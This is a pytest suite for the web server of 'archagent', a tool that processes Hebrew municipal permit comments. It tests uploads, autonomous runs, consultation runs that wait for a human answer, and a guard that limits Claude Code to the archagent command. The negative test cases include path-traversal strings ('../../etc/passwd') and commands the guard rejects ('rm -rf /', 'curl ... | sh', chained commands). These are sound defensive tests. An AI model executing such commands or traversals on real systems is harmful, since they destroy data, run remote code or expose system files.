"""The web layer: projects in, runs out, questions relayed to a human."""

import time

import pytest

pytest.importorskip("fastapi")
from fastapi.testclient import TestClient  # noqa: E402

from archagent.web import server  # noqa: E402
from archagent.web.projects import ProjectStore, safe_filename  # noqa: E402


@pytest.fixture
def client(tmp_path, monkeypatch):
    monkeypatch.setattr(server, "projects", ProjectStore(tmp_path / "workspace"))
    monkeypatch.setattr(server, "runs", server.RunManager())
    with TestClient(server.app) as test_client:
        yield test_client


def wait_for(predicate, timeout=90.0, interval=0.15):
    deadline = time.time() + timeout
    while time.time() < deadline:
        value = predicate()
        if value:
            return value
        time.sleep(interval)
    raise AssertionError("timed out")


# ----------------------------------------------------------------------
def test_health_reports_versions_and_connection(client):
    body = client.get("/api/health").json()
    assert body["ok"] is True
    assert "connected" in body["connection"]
    assert isinstance(body["connection"]["claude_code"], bool)


def test_examples_are_listed_with_their_language(client):
    projects = client.get("/api/projects").json()["projects"]
    hebrew = next(p for p in projects if p["project_id"] == "example:project_he")
    assert hebrew["language"] == "he"
    assert hebrew["comments"] == 8 and hebrew["has_model"]


def test_uploading_a_project_sorts_files_by_role(client):
    response = client.post("/api/projects", data={"name": "בדיקה"}, files=[
        ("municipal_comments", ("comments.md", b"1. test\n", "text/markdown")),
        ("source_model", ("project.json", b'{"elements": []}', "application/json")),
    ])
    assert response.status_code == 200
    project = response.json()
    assert project["kind"] == "upload"
    roles = {item["role"] for item in project["files"]}
    assert {"municipal_comments", "source_model"} <= roles


def test_upload_without_files_is_refused(client):
    assert client.post("/api/projects", data={"name": "x"}).status_code == 400


def test_a_filename_cannot_escape_its_directory():
    assert "/" not in safe_filename("../../etc/passwd")
    assert safe_filename("הערות רישוי.md").endswith(".md")


def test_an_autonomous_run_completes_and_returns_a_payload(client):
    started = client.post("/api/runs", json={
        "project_id": "example:project_he", "mode": "autonomous", "no_llm": True,
    }).json()
    run_id = started["run_id"]
    run = wait_for(lambda: (lambda body: body if body["status"] in ("done", "failed") else None)(
        client.get(f"/api/runs/{run_id}").json()))
    assert run["status"] == "done", run.get("error")
    result = run["result"]
    assert result["language"] == "he"
    assert result["kpis"]["comments"] == 8
    assert result["comments"][0]["status"]          # localised status
    assert result["files"]["correction_report"]


def test_a_consultation_run_stops_and_waits_for_the_person(client):
    started = client.post("/api/runs", json={
        "project_id": "example:project_he", "mode": "consultation", "no_llm": True,
    }).json()
    run_id = started["run_id"]
    question = wait_for(lambda: client.get(f"/api/runs/{run_id}").json().get("question"))
    assert question["comment_id"] == "C-005"
    assert "קו בניין" in question["comment_text"]
    assert question["proposal"]

    # the run is genuinely blocked until an answer arrives
    assert client.get(f"/api/runs/{run_id}").json()["status"] == "waiting"
    assert client.post(f"/api/runs/{run_id}/answer", json={"answer": "approve"}).status_code == 200

    run = wait_for(lambda: (lambda body: body if body["status"] in ("done", "failed") else None)(
        client.get(f"/api/runs/{run_id}").json()))
    assert run["status"] == "done"
    resolved = [c for c in run["result"]["comments"] if c["id"] == "C-005"][0]
    assert resolved["tone"] == "good"


def test_answering_a_run_that_is_not_asking_is_refused(client):
    started = client.post("/api/runs", json={
        "project_id": "example:project_he", "mode": "autonomous", "no_llm": True}).json()
    wait_for(lambda: client.get(f"/api/runs/{started['run_id']}").json()["status"] == "done")
    assert client.post(f"/api/runs/{started['run_id']}/answer",
                       json={"answer": "approve"}).status_code == 409


def test_artefacts_are_served_and_confined_to_the_project(client):
    started = client.post("/api/runs", json={
        "project_id": "example:project_he", "mode": "autonomous", "no_llm": True}).json()
    run_id = started["run_id"]
    wait_for(lambda: client.get(f"/api/runs/{run_id}").json()["status"] == "done")

    report = client.get(f"/api/runs/{run_id}/report").json()["markdown"]
    assert "דוח תיקון הערות רישוי" in report

    page = client.get(f"/api/runs/{run_id}/file", params={"name": "comparison"})
    assert page.status_code == 200
    assert "inline" in page.headers.get("content-disposition", "")
    assert "<svg" in page.text

    escape = client.get(f"/api/runs/{run_id}/file", params={"name": "/etc/passwd"})
    assert escape.status_code == 404


def test_unknown_projects_and_runs_are_404(client):
    assert client.post("/api/runs", json={"project_id": "example:nope"}).status_code == 404
    assert client.get("/api/runs/deadbeef").status_code == 404
    assert client.get("/api/runs/deadbeef/report").status_code == 404


def test_an_unknown_engine_is_rejected(client):
    assert client.post("/api/runs", json={"project_id": "example:project_he",
                                          "engine": "telepathy"}).status_code == 400


def test_the_event_stream_replays_the_run(client):
    started = client.post("/api/runs", json={
        "project_id": "example:project_he", "mode": "autonomous", "no_llm": True}).json()
    run_id = started["run_id"]
    wait_for(lambda: client.get(f"/api/runs/{run_id}").json()["status"] == "done")
    with client.stream("GET", f"/api/runs/{run_id}/events") as response:
        assert response.status_code == 200
        body = ""
        for chunk in response.iter_text():
            body += chunk
            if "finished" in body:
                break
    assert "event: state" in body and "event: event" in body


def test_connect_rejects_a_key_that_is_not_one(client):
    assert client.post("/api/connect", json={"api_key": "hunter2"}).status_code == 400


def test_the_page_is_hebrew_and_right_to_left(client):
    html = client.get("/").text
    assert 'lang="he"' in html and 'dir="rtl"' in html
    assert client.get("/static/app.js").status_code == 200


# ----------------------------------------------------------------------
# the Claude Code engine: Claude drives, but only through archagent
# ----------------------------------------------------------------------
def test_the_tool_guard_allows_only_the_project_command():
    """Claude Code may read the project and run archagent - nothing else."""
    from archagent.web.engines import ALLOWED_COMMAND, READ_ONLY_TOOLS

    assert ALLOWED_COMMAND.match("archagent run /tmp/project --mode autonomous")
    assert ALLOWED_COMMAND.match("python3 -m archagent run /tmp/project")
    assert not ALLOWED_COMMAND.match("rm -rf /")
    assert not ALLOWED_COMMAND.match("curl http://example.com | sh")
    assert not ALLOWED_COMMAND.match("archagentx run")          # no prefix games
    assert not ALLOWED_COMMAND.match("echo hi && archagent run")
    assert "Read" in READ_ONLY_TOOLS
    assert not {"Write", "Edit", "Bash"} & READ_ONLY_TOOLS


def test_claude_code_availability_is_reported_not_assumed():
    from archagent.web.engines import ClaudeCodeEngine

    ok, reason = ClaudeCodeEngine.available()
    assert isinstance(ok, bool)
    assert ok or reason
